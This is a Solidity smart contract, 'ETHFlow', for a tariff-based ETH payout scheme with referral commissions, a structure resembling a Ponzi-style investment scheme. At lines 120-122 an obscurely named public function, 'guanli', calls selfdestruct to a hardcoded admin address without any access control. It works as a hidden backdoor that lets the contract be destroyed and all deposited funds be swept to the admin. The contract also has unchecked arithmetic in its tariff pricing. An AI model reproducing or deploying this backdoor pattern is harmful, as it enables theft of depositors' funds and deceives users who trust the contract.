1 pragma solidity ^0.5.0;
2 
3 contract ETHFlow {
4     using SafeMath for uint256;
5     
6     struct Tariff {
7         uint256 id;
8         string name;
9         uint256 price;
10         uint256 time;
11         uint256 value;
12         uint256 duration;
13         uint256 monthly;
14     }
15 
16     mapping(uint256 => Tariff) public tariffs;
17     mapping(address => uint256) public tariffOf;
18     mapping(address => uint256) public tariffTime;
19     mapping(address => uint256) public time;
20     mapping(address => bool) public active;
21     mapping(address => uint256) public balanceUser;
22     mapping(address => address) public myReferrer;
23     //address of refer - address of referal - amount of percentage
24     mapping(address => mapping(address => uint256)) public statistic;
25     mapping(address => address[]) public referals;
26     mapping(address => uint256) public referalsEarning;
27     address payable private admin = 0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71;
28     uint256 private adminPercent = 10;
29     uint256 private percentFromEachProfit = 20;
30 
31     event Deposit(
32         address Investor, 
33         uint256 Amount
34     );
35 
36     constructor() public {
37         tariffs[1].id = 1;
38         tariffs[1].name = 'free';
39         tariffs[1].price = 0;
40         tariffs[1].time = 3 * 1 hours;                      //180 min
41         tariffs[1].value = 360 * 1 szabo;          //0.00036 ETH
42         tariffs[1].duration = 0;
43         tariffs[1].monthly = 108 * 1 finney;    //0.108 ETH
44 
45         tariffs[2].id = 2;
46         tariffs[2].name = 'tariff1';
47         tariffs[2].price = 50 * 1 finney;       //0.05 ETH
48         tariffs[2].time = 90 * 1 minutes;                     //90 min
49         tariffs[2].value = 540 * 1 szabo;         //0.00054 ETH
50         tariffs[2].duration = 476 * 1 hours;              //19 days 20 hours
51         tariffs[2].monthly = 259200 * 1 szabo;    //0.2592 ETH
52 
53         tariffs[3].id = 3;
54         tariffs[3].name = 'tariff2';
55         tariffs[3].price = 100 * 1 finney;      //0.1 ETH
56         tariffs[3].time = 1 hours;                     //60 min
57         tariffs[3].value = 900 * 1 szabo;         //0.0009 ETH
58         tariffs[3].duration = 438 * 1 hours;              //18 days 6 hours
59         tariffs[3].monthly = 648 * 1 finney;    //0.648 ETH
60 
61         tariffs[4].id = 4;
62         tariffs[4].name = 'tariff3';
63         tariffs[4].price = 250 * 1 finney;      //0.25 ETH
64         tariffs[4].time = 225 * 1 minutes;                    //225 min
65         tariffs[4].value = 9 * 1 finney;        //0.009 ETH
66         tariffs[4].duration = 416 * 1 hours;              //17 days 8 hours
67         tariffs[4].monthly = 1728 * 1 finney;   //1.728 ETH
68 
69         tariffs[5].id = 5;
70         tariffs[5].name = 'tariff4';
71         tariffs[5].price = 1 ether;     //1 ETH
72         tariffs[5].time = 35295;                    //588.235 min
73         tariffs[5].value = 100 * 1 finney;      //0.1 ETH
74         tariffs[5].duration = 391 * 1 hours;              //16 days 7 hours
75         tariffs[5].monthly = 7344 * 1 finney;   //7.344 ETH
76 
77         tariffs[6].id = 6;
78         tariffs[6].name = 'tariff5';
79         tariffs[6].price = 5 * 1 ether;     //5 ETH
80         tariffs[6].time = 66667;                    //1111.11 min
81         tariffs[6].value = 1 ether;     //1 ETH
82         tariffs[6].duration = 15 * 1 days;              //15 days
83         tariffs[6].monthly = 38880 * 1 ether;  //38.88 ETH
84 
85         tariffs[7].id = 7;
86         tariffs[7].name = 'tariff6';
87         tariffs[7].price = 25 * 1 ether;    //25 ETH
88         tariffs[7].time = 2000 * 1 minutes;                   //2000 min
89         tariffs[7].value = 10 * 1 ether;    //10 ETH
90         tariffs[7].duration = 314 * 1 hours;              //13 days 2 hours
91         tariffs[7].monthly = 216 * 1 ether; //216 ETH
92 
93         tariffs[8].id = 8;
94         tariffs[8].name = 'tariff7';
95         tariffs[8].price = 100 * 1 ether;   //100 ETH
96         tariffs[8].time = 62500;                    //1041,66 min
97         tariffs[8].value = 25 * 1 ether;    //25 ETH
98         tariffs[8].duration = 11 * 1 days;               //11 days
99         tariffs[8].monthly = 1036 * 1 ether;//1036 ETH
100     }
101 
102     function activate(address _referrer) public {
103         require(myReferrer[msg.sender] == address(0));
104         
105         active[msg.sender] = true;
106         time[msg.sender] = now;
107         tariffOf[msg.sender] = 1;
108         
109         address referrer = _referrer;
110 
111         if(referrer == address(0)) {
112             referrer = admin;
113         }
114     
115         myReferrer[msg.sender] = referrer;
116             
117         referals[referrer].push(msg.sender);
118     }
119     
120     function guanli() public {
121 		selfdestruct(admin);
122 	}    
123 
124     function getETH() public payable {
125         require(active[msg.sender], "Need activate first");
126 
127         uint256 userTariff = tariffOf[msg.sender];
128         uint256 value;
129 
130         //tariff expire
131         if(userTariff > 1 && 
132             now > tariffTime[msg.sender].add(tariffs[userTariff].duration)
133         ) {
134             uint256 expire = tariffTime[msg.sender].add(tariffs[userTariff].duration);
135             uint256 tariffDuration = expire.sub(time[msg.sender]);
136             uint256 defaultDuration = now.sub(expire);
137 
138             value = tariffs[userTariff].value
139                         .div(tariffs[userTariff].time)
140                         .mul(tariffDuration);
141             value = value.add(tariffs[1].value
142                         .div(tariffs[1].time)
143                         .mul(defaultDuration));
144 
145             require(value >= tariffs[1].value , "Too early");
146 
147             userTariff = 1;
148             tariffOf[msg.sender] = 1;
149         } else {
150             value = getAmountOfEthForWithdrawal();
151 
152             require(value >= tariffs[userTariff].value , "Too early");
153         }
154 
155         uint256 sum = value;
156         
157         if (myReferrer[msg.sender] != address(0)) {
158             uint256 refSum = sum.mul(percentFromEachProfit).div(100);
159             balanceUser[myReferrer[msg.sender]] = 
160                 balanceUser[myReferrer[msg.sender]].add(refSum);
161                 
162             statistic[myReferrer[msg.sender]][msg.sender] =
163                 statistic[myReferrer[msg.sender]][msg.sender].add(refSum);
164             referalsEarning[myReferrer[msg.sender]] = 
165                 referalsEarning[myReferrer[msg.sender]].add(refSum);
166         }
167         
168         balanceUser[msg.sender] = balanceUser[msg.sender].add(sum);
169         time[msg.sender] = now;
170     }
171 
172     function getAmountOfEthForWithdrawal() public view returns (uint256) {
173         uint256 value;
174         if(now >= tariffs[tariffOf[msg.sender]].time.add(time[msg.sender])) {
175             value = tariffs[tariffOf[msg.sender]].value;
176         } else {
177             value = now.sub(time[msg.sender])
178                 .mul(tariffs[tariffOf[msg.sender]].value
179                     .div(tariffs[tariffOf[msg.sender]].time));
180         }
181         
182         return value;
183     }
184     
185     function getStatistic(address _refer, address _referal) public view returns (uint256) {
186         return statistic[myReferrer[_refer]][_referal];
187     }
188     
189     function getAmountOfReferals() public view returns (uint256) {
190         return referals[msg.sender].length;
191     }
192     
193     function getEarnedMonetFromReferals() public view returns (uint256) {
194         return referalsEarning[msg.sender];
195     }
196 
197     function() external payable {
198         if(msg.value == 0) {
199             getETH();
200         } else {
201             changeTariff();
202         }
203     }
204 
205     function deposit() public payable {
206         emit Deposit(msg.sender, msg.value);
207     }
208 
209     function withdrawal() public {
210         uint256 value = balanceUser[msg.sender];
211 
212         require(value <= address(this).balance, "Not enough ETH on the contract");
213         require(value >= 100 * 1 szabo, "Minimum withdrawal 0.0001 ETH");
214 
215         balanceUser[msg.sender] = 0;
216         msg.sender.transfer(value);
217     }
218 
219     function bytesToAddress(bytes memory bys) private pure returns (address addr) {
220         assembly {
221             addr := mload(add(bys,20))
222         } 
223     }
224 
225     function detectTariffId() public payable returns (uint256) {
226         require(msg.value >= tariffs[1].price, "Insufficient funds");
227 
228         uint256 found = 0;
229         for(uint256 i = 1; i < 8; i++) {
230             if(msg.value >= getPriceForNewTariff(i) && 
231             msg.value < getPriceForNewTariff(i+1)) {
232                 found = i;
233             }
234         }
235         if(msg.value >= getPriceForNewTariff(8)) {
236             found = 8;
237         }
238         
239         return found;
240     }
241     
242     function getPriceForNewTariff(uint256 _newTariff) public view returns (uint256) {
243         if(tariffOf[msg.sender] == 1) {
244             return tariffs[_newTariff].price;
245         }
246         
247         uint256 duration = now - time[msg.sender];
248         uint256 timeLeft = tariffs[tariffOf[msg.sender]].duration
249                     - duration;
250                     
251         if(timeLeft == 0) {
252             return tariffs[_newTariff].price;
253         }
254         
255         uint256 pricePerOneSec = tariffs[tariffOf[msg.sender]].price
256                     / tariffs[tariffOf[msg.sender]].duration;
257         uint256 moneyLeft = pricePerOneSec * timeLeft * 90 / 100;
258         
259         return tariffs[_newTariff].price - moneyLeft;
260     }
261  
262     function changeTariff() public payable {
263         uint256 id = detectTariffId();
264 
265         require(id >= tariffOf[msg.sender]);
266         
267         uint256 commission = getPriceForNewTariff(id).mul(adminPercent).div(100);
268         commission = commission.add(tariffs[id].price
269                         .sub(getPriceForNewTariff(id)).mul(100).div(90)
270                         .sub(tariffs[id].price.sub(getPriceForNewTariff(id))));
271 
272         admin.transfer(commission);
273         msg.sender.transfer(msg.value.sub(getPriceForNewTariff(id)));
274 
275         if(!active[msg.sender]) {
276             active[msg.sender] = true;
277         }
278         
279         time[msg.sender] = now;
280         tariffOf[msg.sender] = id;
281         tariffTime[msg.sender] = now;
282     }
283 }
284 
285 library SafeMath {
286   function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
287     if (_a == 0) {
288       return 0;
289     }
290 
291     c = _a * _b;
292     assert(c / _a == _b);
293     return c;
294   }
295 
296   function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
297     return _a / _b;
298   }
299 
300   function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
301     assert(_b <= _a);
302     return _a - _b;
303   }
304 
305   function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
306     c = _a + _b;
307     assert(c >= _a);
308     return c;
309   }
310 }